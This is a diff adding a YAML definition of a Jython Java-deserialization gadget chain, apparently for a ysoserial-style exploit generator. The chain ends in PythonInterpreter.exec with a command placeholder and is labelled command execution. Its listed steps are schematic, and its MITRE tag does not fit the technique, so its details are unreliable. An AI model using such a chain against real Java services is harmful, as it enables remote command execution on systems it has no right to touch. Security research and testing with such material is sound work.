@@ -1,0 +1,25 @@
+name: "Jython"
+category: "jython"
+description: "Jython gadget chain using PythonInterpreter"
+jdk_version: "all"
+dependencies:
+  - name: "jython-standalone"
+    version: "2.7"
+exploit_type: "command_execution"
+payload_type: "command"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/frohoff/ysoserial"
+steps:
+  - class_name: "org.python.core.PyFunction"
+    method_name: "__call__"
+    parameters: []
+  - class_name: "org.python.core.PyObject"
+    method_name: "invoke"
+    parameters:
+      - "{command}"
+  - class_name: "org.python.util.PythonInterpreter"
+    method_name: "exec"
+    parameters:
+      - "{command}"
